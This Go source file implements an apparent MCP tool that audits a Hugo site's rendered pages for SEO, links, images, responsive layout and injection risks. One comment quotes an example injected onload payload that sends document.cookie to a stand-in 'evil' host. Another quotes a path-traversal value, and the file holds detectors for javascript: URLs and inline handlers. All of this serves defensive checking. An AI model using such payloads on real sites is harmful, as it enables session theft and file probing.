package read

import (
	"context"
	"fmt"
	"image"
	_ "image/jpeg" // registers the JPEG decoder with image.DecodeConfig
	_ "image/png"  // registers the PNG decoder with image.DecodeConfig
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/jmrGrav/mcp-hugo-server-go/internal/config"
	"github.com/jmrGrav/mcp-hugo-server-go/internal/hugosite"
	"github.com/jmrGrav/mcp-hugo-server-go/internal/security"
	"github.com/jmrGrav/mcp-hugo-server-go/internal/site"
	"github.com/jmrGrav/mcp-hugo-server-go/internal/toolcontract"
	"github.com/modelcontextprotocol/go-sdk/mcp"
	"golang.org/x/net/html"
)

type inspectRenderedPageInput struct {
	Slug         string `json:"slug"`
	Lang         string `json:"lang,omitempty"`
	ResponseMode string `json:"response_mode,omitempty"`
	// IncludePreview opts into the pre-publish preview facet (#435): a
	// diff summary, this page's broken-link count, and front-matter
	// validity, composed from diff_page/get_broken_links/
	// validate_frontmatter's own logic rather than a new preview_page
	// tool. Off by default — every existing caller's cost is unchanged.
	IncludePreview bool `json:"include_preview,omitempty"`
}

// renderCheckResult is one structured render check, e.g. "title" or
// "internal_links". Status is one of "pass", "warn", "fail". Callers should
// treat "fail" as something to act on, "warn" as advisory, and "pass" as
// clean.
type renderCheckResult struct {
	Check  string `json:"check"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// previewDTO is the opt-in include_preview facet (#435): a pre-publish
// summary combining diff_page's git-diff status, get_broken_links'
// per-page scan, and validate_frontmatter's per-page checks into one
// risks list, so an agent doesn't have to chain three separate calls
// before publishing. Advisory only, same posture as get_broken_links —
// never blocks anything.
type previewDTO struct {
	DiffStatus        string   `json:"diff_status"`
	DiffSummary       string   `json:"diff_summary"`
	BrokenLinksCount  int      `json:"broken_links_count"`
	FrontmatterValid  bool     `json:"frontmatter_valid"`
	FrontmatterIssues []string `json:"frontmatter_issues,omitempty"`
	Risks             []string `json:"risks"`
}

type inspectRenderedPageData struct {
	Slug       string              `json:"slug"`
	URL        string              `json:"url"`
	Lang       string              `json:"lang"`
	OutputPath string              `json:"output_path"`
	State      site.LifecycleState `json:"state"`
	Status     string              `json:"status"`
	Checks     []renderCheckResult `json:"checks"`
	// ResponsiveChecks is a static-analysis heuristic surface (#1138): no
	// headless browser, no real viewport rendering (see docs/mcp-contract.md
	// §6.20). Always present, purely additive — unlike Checks above, none of
	// its fields influence Status.
	ResponsiveChecks responsiveChecksDTO `json:"responsive_checks"`
	// Preview is populated only when include_preview=true is requested.
	Preview *previewDTO `json:"preview,omitempty"`
}

// responsiveTablesDTO: Count is every content <table> found in the
// rendered document — excluding Hugo chroma's `lineNumbersInTable` output
// (an `lntable`/`highlighttable` wrapping every code block purely for
// line-number alignment; without this exclusion `count`/`long_cell_risk`
// would fire on ordinary code lines instead of real content tables).
// FixedWidth counts tables carrying a fixed pixel width (attribute or
// inline `width:` style) rather than a percentage/auto width — `max-width`
// does not count. ResponsiveWrapper counts tables with an ancestor whose
// class/style indicates an actual horizontal-scroll container (e.g.
// `table-responsive`, `overflow-x: auto`) — a bare "overflow" match
// (`overflow: hidden`, `class="overflow-hidden"`) does not count, since
// that clips content rather than scrolling it. LongCellRisk counts tables
// containing at least one cell with an unbreakable token 25+ characters
// long (a URL, file path, or similarly long unspaced string) that can
// force a table wider than its container regardless of wrapping.
type responsiveTablesDTO struct {
	Count             int `json:"count"`
	FixedWidth        int `json:"fixed_width"`
	ResponsiveWrapper int `json:"responsive_wrapper"`
	LongCellRisk      int `json:"long_cell_risk"`
}

// responsiveCodeBlocksDTO: Count is every raw <pre> element found — under
// Hugo chroma's `lineNumbersInTable` output this can be up to 2x the number
// of logical code blocks (a separate <pre> for the line-number gutter and
// for the code itself), since this field intentionally makes no attempt to
// deduplicate that structure. OverflowSafe is false only when a code block
// itself carries a fixed pixel width or a `nowrap` token in its inline
// style — an anti-pattern heuristic, not a positive confirmation that the
// theme's own CSS provides overflow-x scrolling (that theme-constant
// property is reported once by get_theme_status, not recomputed per page
// here).
type responsiveCodeBlocksDTO struct {
	Count        int  `json:"count"`
	OverflowSafe bool `json:"overflow_safe"`
}

// responsiveImagesDTO: Count is every <img> element found. Responsive is
// false only when at least one image has a hardcoded pixel width over 400
// and no responsive escape hatch (a `max-width` style or a `srcset`
// attribute) — such an image cannot shrink to fit a narrow viewport.
type responsiveImagesDTO struct {
	Count      int  `json:"count"`
	Responsive bool `json:"responsive"`
}

// responsiveChecksDTO reports structural risk signals from the rendered
// DOM, not a verified rendering outcome — these are heuristics over static
// HTML/inline styles, not a measurement of what a real browser would
// actually paint at any viewport width. See docs/mcp-contract.md §6.20 for
// the full scope statement and the theme-constant vs. per-page split with
// get_theme_status.table_overflow_protection.
type responsiveChecksDTO struct {
	Tables     responsiveTablesDTO     `json:"tables"`
	CodeBlocks responsiveCodeBlocksDTO `json:"code_blocks"`
	Images     responsiveImagesDTO     `json:"images"`
}

type inspectRenderedPageOutput struct {
	toolcontract.ToolResponse[inspectRenderedPageData]
}

func newInspectRenderedPageOutput(data inspectRenderedPageData, now time.Time) inspectRenderedPageOutput {
	return inspectRenderedPageOutput{ToolResponse: successEnvelope(data, now)}
}

// hugoRenderErrorRe matches known Hugo render/shortcode failure signatures
// that Hugo itself embeds directly into the output HTML rather than failing
// the build (e.g. a shortcode error inside a "warn" ErrorLevel build, or
// `--renderToMemory` continuing past a broken partial). It is deliberately
// narrow: it does not flag literal "{{ }}" template syntax that a page might
// display as example content (e.g. a blog post about Hugo templating),
// because that would be a false positive on legitimate content.
var hugoRenderErrorRe = regexp.MustCompile(`(?i)error calling |failed to render|html/template:|text/template:|shortcode "[^"]*" not found|partial "[^"]*" not found`)
var titleMarkupRe = regexp.MustCompile(`(?is)<title[^>]*>[^<]*<[^/!][^>]*>[^<]*</title>`)
var previewTokenLeakRe = regexp.MustCompile(`(?i)/preview/[0-9a-f]{16}/[0-9a-f]{48}/`)

// RegisterInspectRenderedPage registers inspect_rendered on s. It is
// called from RegisterWithSourceIndex alongside the other content.read tools
// that need both the public site index and the source index.
func RegisterInspectRenderedPage(s *mcp.Server, idx *site.Index, srcIdx *hugosite.SourceIndex, cfg config.Config) {
	if s == nil {
		return
	}
	addReadOnlyTool(s, "inspect_rendered", "Inspect rendered page", "Validate the rendered HTML/SEO/link surface of a single page from the current public build output: title, meta description, canonical URL, hreflang alternates, internal links, missing images, a dedicated `featured_image` check, and heuristic shortcode/render-error markers. For multilingual bundles, pass `lang` to select a translation explicitly; a bare slug that resolves among several translations returns an explicit warning. Complements validate_frontmatter (source-only) and get_broken_links (site-wide). The `featured_image` check (#818) is separate from the general `missing_images` check — `missing_images` treats every `<img>` uniformly and can't tell a broken hero image apart from a broken body image. `fail` means the configured `featuredImage` path doesn't resolve to a file in the built public output; `warn` covers non-broken but fixable issues (missing alt text on the rendered `<img>` referencing it — checked against both `src` and `data-src`, since lazy-loading theme markup can put the real URL in either — or an `og:image` meta tag that doesn't match); `pass` covers both \"configured and clean\" and \"no featuredImage set at all\" (nothing to check). All checks are local filesystem/DOM inspection only, never an outbound HTTP request to the page's own public URL. The `hreflang` check parses the rendered <link> tags directly, independent of attribute order/case, and flags a tag with an empty href as incomplete rather than accepting it; a `warn` here can still mean the page genuinely has no translations, or that the Hugo theme's template doesn't emit hreflang tags for translated pages at all — confirm the page-bundle actually has a translated sibling before treating a warn as a theme bug. Also reports `responsive_checks` (#1138): static-analysis-only heuristics over the rendered DOM for mobile layout risk — wide/fixed-width tables, unwrapped tables with long unbreakable cell content, fixed-width code blocks, and oversized fixed-width images. No headless browser or real viewport rendering; see docs/mcp-contract.md §6.20. Purely additive, never affects `status`. The theme-constant question \"does this site's CSS scroll wide tables horizontally at all\" is answered once by get_theme_status's `table_overflow_protection`, not recomputed per page here. Set `include_preview=true` for a combined pre-publish summary (`preview.diff_status`/`diff_summary` from the current git diff, `preview.broken_links_count` scoped to this page, `preview.frontmatter_valid`/`frontmatter_issues`, and an overall `preview.risks` list) instead of chaining diff_page + get_broken_links + validate_frontmatter separately — composes their existing logic, doesn't duplicate it; off by default, so this costs nothing unless requested (#435). Reader tool: on OAuth-enabled deployments, call it with a read Bearer token.",
		func(ctx context.Context, _ *mcp.CallToolRequest, in inspectRenderedPageInput) (*mcp.CallToolResult, inspectRenderedPageOutput, error) {
			if idx == nil {
				return nil, inspectRenderedPageOutput{}, fmt.Errorf("index not initialized")
			}
			slug := strings.TrimSpace(in.Slug)
			if slug == "" {
				return nil, inspectRenderedPageOutput{}, fmt.Errorf("invalid_params: slug must not be empty")
			}
			if err := validateSlugLangConsistency(slug, in.Lang); err != nil {
				return nil, inspectRenderedPageOutput{}, err
			}

			resolver := site.NewPageResolver(idx, srcIdx, cfg)
			resolved, ok := resolver.ResolveWithLang(slug, strings.TrimSpace(in.Lang))
			if !ok || resolved.Public == nil {
				return nil, inspectRenderedPageOutput{}, fmt.Errorf("content_not_found: no rendered public page found for slug %q", slug)
			}
			page := *resolved.Public

			doc, raw, err := loadRenderedHTML(cfg, page)
			if err != nil {
				return nil, inspectRenderedPageOutput{}, fmt.Errorf("render_output_unavailable: %v", err)
			}

			checks := []renderCheckResult{
				checkTitle(doc),
				checkMetaDescription(doc),
				checkCanonical(doc, cfg.SiteURL, page.Slug),
				checkHreflang(doc, idx, page),
				checkInternalLinks(cfg, idx, page, doc),
				checkMissingImages(cfg, page, doc),
				checkFeaturedImage(cfg, resolved, doc),
				checkRenderedTitleMarkup(raw),
				checkRenderedInlineEventHandlers(doc),
				checkRenderedUnsafeURLs(doc),
				checkRenderedPreviewTokenLeak(raw),
				checkRenderErrors(raw),
			}

			state := site.LifecycleState{}
			if srcIdx != nil {
				state = resolvedState(resolved, cfg.SiteRoot)
			}

			overall := "ok"
			for _, c := range checks {
				if c.Status == "fail" {
					overall = "issues_found"
					break
				}
				if c.Status == "warn" && overall == "ok" {
					overall = "warnings_found"
				}
			}

			var preview *previewDTO
			if in.IncludePreview {
				p := premutationPreview(ctx, idx, cfg, resolved, page, doc)
				preview = &p
				// Invalid preview frontmatter is a fail-equivalent finding
				// (#1046) and must escalate regardless of the checks loop's
				// own status — not just from "ok": a page already at
				// "warnings_found" (from an unrelated warn-level check)
				// must still escalate to "issues_found" here, the same way
				// a "fail" in the loop above always wins over a "warn".
				if !p.FrontmatterValid {
					overall = "issues_found"
				}
			}

			data := inspectRenderedPageData{
				Slug:             page.Slug,
				URL:              page.URL,
				Lang:             page.Lang,
				OutputPath:       page.OutputPath,
				State:            state,
				Status:           overall,
				Checks:           checks,
				ResponsiveChecks: computeResponsiveChecks(doc),
			}
			data.Preview = preview
			out := newInspectRenderedPageOutput(data, time.Now().UTC())
			if warning := implicitMultilingualResolutionWarning(slug, in.Lang, resolved, srcIdx, cfg); warning != "" {
				out.Warnings = []string{warning}
			}
			return nil, out, nil
		})
}

func checkTitle(doc *html.Node) renderCheckResult {
	title := strings.TrimSpace(firstElementText(doc, "title"))
	if title == "" {
		return renderCheckResult{Check: "title", Status: "fail", Detail: "no <title> element found in rendered output"}
	}
	if len(title) > 70 {
		return renderCheckResult{Check: "title", Status: "warn", Detail: "title is " + strconv.Itoa(len(title)) + " characters, longer than the ~70 character SEO guideline"}
	}
	return renderCheckResult{Check: "title", Status: "pass"}
}

func checkMetaDescription(doc *html.Node) renderCheckResult {
	desc := ""
	walkNodes(doc, func(n *html.Node) bool {
		if n.Type == html.ElementNode && n.Data == "meta" && strings.EqualFold(htmlAttr(n, "name"), "description") {
			desc = strings.TrimSpace(htmlAttr(n, "content"))
			return false
		}
		return true
	})
	if desc == "" {
		return renderCheckResult{Check: "meta_description", Status: "fail", Detail: "no <meta name=\"description\"> found in rendered output"}
	}
	if len(desc) > 160 {
		return renderCheckResult{Check: "meta_description", Status: "warn", Detail: "meta description is " + strconv.Itoa(len(desc)) + " characters, longer than the ~160 character SEO guideline"}
	}
	return renderCheckResult{Check: "meta_description", Status: "pass"}
}

// checkCanonical compares the rendered <link rel="canonical"> against an
// expected self-URL built independently from cfg.SiteURL + the page's own
// slug — not against page.URL, which the index copies straight out of the
// same canonical tag during indexing (comparing against that would be
// comparing the tag to itself and could never detect a real mismatch).
func checkCanonical(doc *html.Node, siteURL, slug string) renderCheckResult {
	canonical := ""
	walkNodes(doc, func(n *html.Node) bool {
		if n.Type == html.ElementNode && n.Data == "link" && strings.Contains(strings.ToLower(htmlAttr(n, "rel")), "canonical") {
			canonical = strings.TrimSpace(htmlAttr(n, "href"))
			return false
		}
		return true
	})
	if canonical == "" {
		return renderCheckResult{Check: "canonical", Status: "fail", Detail: "no <link rel=\"canonical\"> found in rendered output"}
	}
	siteURL = strings.TrimRight(strings.TrimSpace(siteURL), "/")
	if siteURL == "" {
		return renderCheckResult{Check: "canonical", Status: "pass"}
	}
	expected := siteURL + slug
	if canonical != expected {
		return renderCheckResult{Check: "canonical", Status: "warn", Detail: fmt.Sprintf("canonical %q does not match the page's own URL %q", canonical, expected)}
	}
	return renderCheckResult{Check: "canonical", Status: "pass"}
}

// checkHreflang only asserts that hreflang alternates exist when the site is
// genuinely multilingual (more than one language present across the public
// index). It does not attempt to verify that every language variant is
// individually cross-linked — that requires bundle-relation data this tool
// does not have — so a "pass" here means "hreflang present", not "hreflang
// complete."
//
// Detection walks the parsed DOM (*html.Node from golang.org/x/net/html),
// not raw HTML text, so it is inherently immune to attribute order and to
// attribute-*name* case (the tokenizer already lowercases element/attribute
// names per the HTML spec, and htmlAttr compares case-insensitively too);
// rel is compared case-insensitively as a substring since Hugo/theme output
// may combine it with other rel values (e.g. rel="alternate stylesheet").
// #420 added the href-non-empty check: a <link rel="alternate" hreflang="fr">
// with no href is a broken/incomplete tag, not a valid alternate, and must
// not be silently accepted as "found".
//
// A "warn" here can mean one of three different things this tool cannot
// distinguish without operator confirmation: (1) a real parser miss (should
// no longer happen after #420's DOM-based, order/case-independent check),
// (2) this specific page genuinely has no translations even though other
// site content does, or (3) the Hugo theme's <head> template simply never
// emits hreflang tags for translated pages — a theme-side gap, not a bug in
// this server. Confirm the page-bundle actually has a translated sibling
// before treating a "warn" as a theme bug report.
func checkHreflang(doc *html.Node, idx *site.Index, page site.Page) renderCheckResult {
	if !siteIsMultilingual(idx) {
		return renderCheckResult{Check: "hreflang", Status: "pass", Detail: "single-language site, hreflang not applicable"}
	}
	foundComplete, foundIncomplete := false, false
	walkNodes(doc, func(n *html.Node) bool {
		if n.Type == html.ElementNode && n.Data == "link" &&
			strings.Contains(strings.ToLower(htmlAttr(n, "rel")), "alternate") &&
			strings.TrimSpace(htmlAttr(n, "hreflang")) != "" {
			if strings.TrimSpace(htmlAttr(n, "href")) != "" {
				foundComplete = true
				return false
			}
			foundIncomplete = true
		}
		return true
	})
	if foundComplete {
		return renderCheckResult{Check: "hreflang", Status: "pass"}
	}
	if foundIncomplete {
		return renderCheckResult{Check: "hreflang", Status: "warn", Detail: "found <link rel=\"alternate\" hreflang=...> for this page but its href is empty"}
	}
	return renderCheckResult{Check: "hreflang", Status: "warn", Detail: "site has multiple languages but no <link rel=\"alternate\" hreflang=...> found for this page"}
}

func siteIsMultilingual(idx *site.Index) bool {
	if idx == nil {
		return false
	}
	langs := map[string]struct{}{}
	for _, p := range idx.ContentPages() {
		if p.Lang != "" {
			langs[p.Lang] = struct{}{}
		}
		if len(langs) > 1 {
			return true
		}
	}
	return false
}

// brokenInternalLinksFromDoc walks the freshly-parsed doc (not the cached
// page.RawHTML from idx, which was read at server-start and can be stale
// relative to the current on-disk build) so callers validate the current
// rendered output. Shared by checkInternalLinks and computePreview (#435)
// so the two can never disagree about how many broken links this page has
// — using brokenLinksForPage's stale RawHTML for one and this for the
// other would let a single inspect_rendered response contradict itself
// under build drift, exactly the condition this tool exists to catch.
// staticFileExists reports whether publicPath (a public-URL path such as
// "/pgp-key.txt") resolves to a real file under the built site output —
// shared by every internal-link-brokenness check (#1155) so a real static
// file that was never a Hugo content page is never misreported as broken,
// on any of this codebase's link-checking paths.
func staticFileExists(cfg config.Config, publicPath string) bool {
	localPath := filepath.Join(cfg.SiteRoot, filepath.FromSlash(strings.TrimPrefix(publicPath, "/")))
	_, statErr := os.Stat(localPath)
	return statErr == nil
}

func brokenInternalLinksFromDoc(cfg config.Config, idx *site.Index, page site.Page, doc *html.Node) ([]string, error) {
	base, err := url.Parse(page.URL)
	if err != nil {
		return nil, err
	}
	previewPrefix := previewPrefixFromPath(base.Path)
	classifier := site.NewClassifier(idx)
	var broken []string
	for _, href := range extractLinksFromDoc(doc) {
		target, ok := resolveInternalLink(base, href)
		if !ok {
			continue
		}
		target.Path = stripPreviewPrefix(target.Path, previewPrefix)
		if shouldIgnoreBrokenLinkTarget(classifier, target.Path) {
			continue
		}
		if targetPage, found := idx.GetBySlug(target.Path); found && classifier.IsContent(*targetPage) {
			continue
		}
		// Not a recognized content page — before declaring it broken, check
		// whether it's a real static file that was never a Hugo content page
		// (e.g. /pgp-key.txt, referenced by security.txt) (#1155).
		if staticFileExists(cfg, target.Path) {
			continue
		}
		broken = append(broken, href)
	}
	return broken, nil
}

func checkInternalLinks(cfg config.Config, idx *site.Index, page site.Page, doc *html.Node) renderCheckResult {
	broken, err := brokenInternalLinksFromDoc(cfg, idx, page, doc)
	if err != nil {
		return renderCheckResult{Check: "internal_links", Status: "warn", Detail: "page URL could not be parsed, skipped internal link check"}
	}
	if len(broken) > 0 {
		sample := broken
		if len(sample) > 5 {
			sample = sample[:5]
		}
		return renderCheckResult{Check: "internal_links", Status: "fail", Detail: fmt.Sprintf("%d broken internal link(s), e.g. %s", len(broken), strings.Join(sample, ", "))}
	}
	return renderCheckResult{Check: "internal_links", Status: "pass"}
}

func checkMissingImages(cfg config.Config, page site.Page, doc *html.Node) renderCheckResult {
	base, err := url.Parse(page.URL)
	if err != nil {
		return renderCheckResult{Check: "missing_images", Status: "warn", Detail: "page URL could not be parsed, skipped image check"}
	}
	previewPrefix := previewPrefixFromPath(base.Path)
	var missing []string
	walkNodes(doc, func(n *html.Node) bool {
		if n.Type == html.ElementNode && n.Data == "img" {
			src := strings.TrimSpace(htmlAttr(n, "src"))
			if src == "" {
				return true
			}
			target, ok := resolveInternalLink(base, src)
			if !ok {
				return true
			}
			target.Path = stripPreviewPrefix(target.Path, previewPrefix)
			localPath := filepath.Join(cfg.SiteRoot, filepath.FromSlash(strings.TrimPrefix(target.Path, "/")))
			if _, statErr := os.Stat(localPath); statErr != nil {
				missing = append(missing, src)
			}
		}
		return true
	})
	if len(missing) > 0 {
		sample := missing
		if len(sample) > 5 {
			sample = sample[:5]
		}
		return renderCheckResult{Check: "missing_images", Status: "fail", Detail: fmt.Sprintf("%d missing local image(s), e.g. %s", len(missing), strings.Join(sample, ", "))}
	}
	return renderCheckResult{Check: "missing_images", Status: "pass"}
}

// checkFeaturedImage (#818) is a dedicated check for the page's featuredImage
// (as opposed to checkMissingImages, which treats every <img> uniformly and
// can't tell a broken hero image apart from a broken body image). All
// sub-checks are local filesystem/DOM inspection, deliberately not an
// outbound HTTP request to the page's own public URL: this server's own
// production deployment terminates TLS upstream of the process it runs in,
// so a self-fetch of the page's https:// URL is not guaranteed to even
// resolve from where the server runs, and a network call would add latency/
// hang/egress failure modes to what is otherwise an entirely local, fast,
// deterministic tool.
func checkFeaturedImage(cfg config.Config, resolved site.ResolvedPage, doc *html.Node) renderCheckResult {
	if resolved.Source == nil {
		return renderCheckResult{Check: "featured_image", Status: "pass", Detail: "no source frontmatter available to check"}
	}
	featuredImage := frontmatterStringValue(resolved.Source.FrontmatterRaw["featuredImage"])
	if featuredImage == "" {
		return renderCheckResult{Check: "featured_image", Status: "pass", Detail: "no featuredImage configured"}
	}

	// featuredImage is a generic, agent-writable frontmatter string (set via
	// update_page's fields passthrough, validated only for control
	// characters, not path shape) — resolve it through the same PathGuard
	// containment every other on-disk lookup in this codebase uses, rather
	// than a bare filepath.Join. filepath.Join alone runs Clean, which
	// collapses ".." and would let e.g. featuredImage: /../../../etc/hostname
	// resolve outside SiteRoot, turning this read-only SEO check into an
	// arbitrary-file existence/size/dimensions oracle.
	guard, err := security.New(cfg.SiteRoot, true)
	if err != nil {
		return renderCheckResult{Check: "featured_image", Status: "warn", Detail: "could not initialize path guard to validate featuredImage"}
	}
	localPath, err := guard.SafeJoin(strings.TrimPrefix(featuredImage, "/"))
	if err != nil {
		return renderCheckResult{Check: "featured_image", Status: "fail", Detail: fmt.Sprintf("featuredImage %q is not a safe path (%v)", featuredImage, err)}
	}
	info, statErr := os.Stat(localPath)
	if statErr != nil {
		return renderCheckResult{Check: "featured_image", Status: "fail", Detail: fmt.Sprintf("featuredImage %q is configured but not found in the built public output", featuredImage)}
	}
	if info.IsDir() {
		return renderCheckResult{Check: "featured_image", Status: "fail", Detail: fmt.Sprintf("featuredImage %q resolves to a directory, not a file", featuredImage)}
	}

	var warnings []string
	detail := fmt.Sprintf("configured=%s, exists=true", featuredImage)
	if info.Size() == 0 {
		warnings = append(warnings, "file exists but is 0 bytes")
	} else if f, err := os.Open(localPath); err == nil {
		cfgImg, _, decErr := image.DecodeConfig(f)
		_ = f.Close()
		if decErr == nil {
			detail += fmt.Sprintf(", dimensions=%dx%d", cfgImg.Width, cfgImg.Height)
		}
	}

	// Theme markup may lazy-load images via data-src with a placeholder src
	// (confirmed live: this site's rendered <img> for its own hero image
	// uses data-src, not src, for the real URL) — check both attributes so
	// the alt-text check isn't blind to lazy-loaded markup.
	altMissing := true
	walkNodes(doc, func(n *html.Node) bool {
		if n.Type == html.ElementNode && n.Data == "img" {
			src := strings.TrimSpace(htmlAttr(n, "src"))
			dataSrc := strings.TrimSpace(htmlAttr(n, "data-src"))
			if src == featuredImage || dataSrc == featuredImage {
				if strings.TrimSpace(htmlAttr(n, "alt")) != "" {
					altMissing = false
				}
				return false
			}
		}
		return true
	})
	if altMissing {
		warnings = append(warnings, "no alt text found on the rendered <img> referencing this image")
	}

	ogImage := ""
	walkNodes(doc, func(n *html.Node) bool {
		if n.Type == html.ElementNode && n.Data == "meta" &&
			(strings.EqualFold(htmlAttr(n, "property"), "og:image") || strings.EqualFold(htmlAttr(n, "name"), "og:image")) {
			ogImage = strings.TrimSpace(htmlAttr(n, "content"))
			return false
		}
		return true
	})
	if siteURL := strings.TrimRight(strings.TrimSpace(cfg.SiteURL), "/"); siteURL != "" && ogImage != "" {
		expectedOG := siteURL + featuredImage
		if ogImage != expectedOG {
			warnings = append(warnings, fmt.Sprintf("og:image %q does not match featuredImage's expected public URL %q", ogImage, expectedOG))
		}
	}

	if len(warnings) > 0 {
		return renderCheckResult{Check: "featured_image", Status: "warn", Detail: detail + "; " + strings.Join(warnings, "; ")}
	}
	return renderCheckResult{Check: "featured_image", Status: "pass", Detail: detail}
}

func checkRenderErrors(raw []byte) renderCheckResult {
	if hugoRenderErrorRe.Match(raw) {
		return renderCheckResult{Check: "render_errors", Status: "fail", Detail: "rendered output contains a Hugo shortcode/template error marker"}
	}
	return renderCheckResult{Check: "render_errors", Status: "pass"}
}

func checkRenderedTitleMarkup(raw []byte) renderCheckResult {
	if titleMarkupRe.Match(raw) {
		return renderCheckResult{Check: "security_title_markup", Status: "fail", Detail: "rendered <title> contains raw markup instead of escaped text"}
	}
	return renderCheckResult{Check: "security_title_markup", Status: "pass"}
}

func checkRenderedInlineEventHandlers(doc *html.Node) renderCheckResult {
	var findings []string
	walkNodes(doc, func(n *html.Node) bool {
		if n.Type != html.ElementNode {
			return true
		}
		for _, attr := range n.Attr {
			key := strings.ToLower(strings.TrimSpace(attr.Key))
			if strings.HasPrefix(key, "on") && strings.TrimSpace(attr.Val) != "" {
				if isBenignStylesheetPreloadOnload(n, key, attr.Val) {
					continue
				}
				findings = append(findings, fmt.Sprintf("<%s> has inline handler %s", n.Data, key))
				if len(findings) >= 5 {
					return false
				}
			}
		}
		return true
	})
	if len(findings) > 0 {
		return renderCheckResult{Check: "security_inline_event_handlers", Status: "fail", Detail: strings.Join(findings, "; ")}
	}
	return renderCheckResult{Check: "security_inline_event_handlers", Status: "pass"}
}

// benignStylesheetPreloadOnloadValues is the exact, known-safe loadCSS
// polyfill idiom for lazy-loading a stylesheet via <link rel=preload
// as=style onload=...>. isBenignStylesheetPreloadOnload requires an exact
// match (after trimming/case-folding) against one of these — not a substring
// containment check — because this function's only job is to exempt a
// specific known-benign static theme pattern from
// checkRenderedInlineEventHandlers, the detector that exists to catch
// injected inline event handlers. A Contains-based check would let an
// attacker-controlled onload value that merely embeds this substring (e.g.
// `onload="this.rel='stylesheet';fetch('https://evil/x?c='+document.cookie)"`)
// slip past the detector unflagged, defeating its purpose for the one
// pattern most likely to actually be exploited.
//
// Only the this.onload=null;this.rel=... form is listed: it's the one
// pattern LoveIt's own layouts/_partials/plugin/style.html actually emits
// (single-quoted). A bare this.rel=... with no this.onload=null prefix
// leaves the handler attached after firing once — that's not what the
// theme does, and it would be a weaker, more injection-shaped signal to
// wave through, so it's deliberately not included without a confirmed
// emitter for it.
var benignStylesheetPreloadOnloadValues = map[string]struct{}{
	`this.onload=null;this.rel='stylesheet'`: {},
	`this.onload=null;this.rel="stylesheet"`: {},
}

func isBenignStylesheetPreloadOnload(n *html.Node, key, val string) bool {
	if n == nil || n.Type != html.ElementNode || n.Data != "link" || key != "onload" {
		return false
	}
	rel := strings.ToLower(strings.TrimSpace(htmlAttr(n, "rel")))
	as := strings.ToLower(strings.TrimSpace(htmlAttr(n, "as")))
	val = strings.ToLower(strings.TrimSpace(val))
	val = strings.TrimSuffix(val, ";")
	if rel != "preload" || as != "style" {
		return false
	}
	_, ok := benignStylesheetPreloadOnloadValues[val]
	return ok
}

func previewPrefixFromPath(path string) string {
	parts := strings.Split(strings.Trim(path, "/"), "/")
	if len(parts) < 2 || parts[0] != "preview" {
		return ""
	}
	return "/preview/" + parts[1]
}

func stripPreviewPrefix(path, prefix string) string {
	if prefix == "" || !strings.HasPrefix(path, prefix+"/") {
		return path
	}
	stripped := strings.TrimPrefix(path, prefix)
	if stripped == "" {
		return "/"
	}
	return stripped
}

func checkRenderedUnsafeURLs(doc *html.Node) renderCheckResult {
	var findings []string
	walkNodes(doc, func(n *html.Node) bool {
		if n.Type != html.ElementNode {
			return true
		}
		for _, attr := range n.Attr {
			key := strings.ToLower(strings.TrimSpace(attr.Key))
			if !isRenderedURLAttr(key) {
				continue
			}
			val := strings.TrimSpace(attr.Val)
			lower := strings.ToLower(val)
			switch {
			case strings.HasPrefix(lower, "javascript:"):
				findings = append(findings, fmt.Sprintf("<%s> %s uses javascript: URL", n.Data, key))
			case strings.HasPrefix(lower, "vbscript:"):
				findings = append(findings, fmt.Sprintf("<%s> %s uses vbscript: URL", n.Data, key))
			case strings.HasPrefix(lower, "data:") && !isSafeRenderedDataURL(n.Data, key, lower):
				findings = append(findings, fmt.Sprintf("<%s> %s uses unsafe data: URL", n.Data, key))
			}
			if len(findings) >= 5 {
				return false
			}
		}
		return true
	})
	if len(findings) > 0 {
		return renderCheckResult{Check: "security_unsafe_urls", Status: "fail", Detail: strings.Join(findings, "; ")}
	}
	return renderCheckResult{Check: "security_unsafe_urls", Status: "pass"}
}

func checkRenderedPreviewTokenLeak(raw []byte) renderCheckResult {
	if previewTokenLeakRe.Match(raw) {
		return renderCheckResult{Check: "security_preview_token_leak", Status: "fail", Detail: "rendered output contains a token-bearing /preview/{id}/{token}/ URL"}
	}
	return renderCheckResult{Check: "security_preview_token_leak", Status: "pass"}
}

func isRenderedURLAttr(key string) bool {
	switch key {
	case "href", "src", "data-src", "action", "formaction", "poster":
		return true
	default:
		return false
	}
}

func isSafeRenderedDataURL(nodeName, attrName, lower string) bool {
	return (attrName == "src" || attrName == "data-src") && nodeName == "img" && strings.HasPrefix(lower, "data:image/")
}

// walkNodes runs visit over doc and every descendant in document order,
// depth-first. visit returns false to stop the walk early (e.g. once a
// unique element has been found).
func walkNodes(doc *html.Node, visit func(*html.Node) bool) {
	if doc == nil {
		return
	}
	var stop bool
	var walk func(*html.Node)
	walk = func(n *html.Node) {
		if n == nil || stop {
			return
		}
		if !visit(n) {
			stop = true
			return
		}
		for c := n.FirstChild; c != nil && !stop; c = c.NextSibling {
			walk(c)
		}
	}
	walk(doc)
}

// extractLinksFromDoc collects every <a href> in doc, in document order.
// Mirrors extended.go's extractLinks (which operates on an HTML string from
// the cached index), but works directly off an already-parsed *html.Node so
// callers reading a fresh file don't need to re-serialize it back to a
// string first.
func extractLinksFromDoc(doc *html.Node) []string {
	var links []string
	walkNodes(doc, func(n *html.Node) bool {
		if n.Type == html.ElementNode && n.Data == "a" {
			if href := strings.TrimSpace(htmlAttr(n, "href")); href != "" {
				links = append(links, href)
			}
		}
		return true
	})
	return links
}

func firstElementText(doc *html.Node, tag string) string {
	text := ""
	walkNodes(doc, func(n *html.Node) bool {
		if n.Type == html.ElementNode && n.Data == tag {
			text = renderTextContent(n)
			return false
		}
		return true
	})
	return text
}

var (
	// inlineFixedWidthPxRe requires a word boundary (start-of-string or a
	// preceding `;`/whitespace) before "width" so it does not match inside
	// `max-width: 900px` — max-width is the responsive-friendly declaration,
	// the opposite of what this regex exists to flag.
	inlineFixedWidthPxRe = regexp.MustCompile(`(?i)(^|[;\s])width\s*:\s*[0-9]+px`)
	longUnbreakableToken = regexp.MustCompile(`\S{25,}`)
	// scrollWrapperClassRe/scrollWrapperStyleRe require the value to
	// indicate an actual scroll container (overflow-x/overflow set to auto
	// or scroll), not merely contain the substring "overflow" — a bare
	// overflow:hidden or class="overflow-hidden" clips content instead of
	// scrolling it and must not count as protection.
	scrollWrapperClassRe = regexp.MustCompile(`overflow(-x)?-(auto|scroll)`)
